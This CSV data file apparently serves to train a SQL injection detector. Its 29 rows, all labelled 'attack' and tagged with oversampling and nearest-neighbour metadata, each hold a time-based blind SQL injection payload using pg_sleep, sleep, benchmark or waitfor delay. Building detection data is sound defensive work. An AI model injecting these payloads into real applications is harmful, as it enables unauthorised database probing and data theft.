id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000150,1.0793027465352327
SMOTE_000002,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000074,1.6875984776221375
SMOTE_000003,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000078,0.39535239837463393
SMOTE_000004,attack,time,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",nearest_attack_euclidean,R000117,1.1733796982806324
SMOTE_000005,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000065,0.16437088793424878
SMOTE_000006,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,0.3620070303770396
SMOTE_000007,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.6298375749141787
SMOTE_000008,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000100,1.4305056046436073
SMOTE_000009,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,1.806561375341777
SMOTE_000010,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000032,1.253749117503568
SMOTE_000011,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000079,0.28369913051514145
SMOTE_000012,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000144,0.1840025810832973
SMOTE_000013,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.00873020367259304
SMOTE_000014,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000045,0.2721548141882352
SMOTE_000015,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000066,1.084100727232438
SMOTE_000016,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.04702501698166727
SMOTE_000017,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000154,1.1371008939024476
SMOTE_000018,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000019,1.175087341880821
SMOTE_000019,attack,time,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000116,0.48235526509019183
SMOTE_000020,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.9952246011812157
SMOTE_000021,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,1.1111044498088696
SMOTE_000022,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,1.1955790598833793
SMOTE_000023,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000030,1.0386261479643784
SMOTE_000024,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000154,0.9195134994717397
SMOTE_000025,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000132,0.28519826886702176
SMOTE_000026,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000009,1.841351273622728
SMOTE_000027,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000120,2.131792731842045
SMOTE_000028,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000119,1.5203344061519994
SMOTE_000029,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,2.4889158753086478
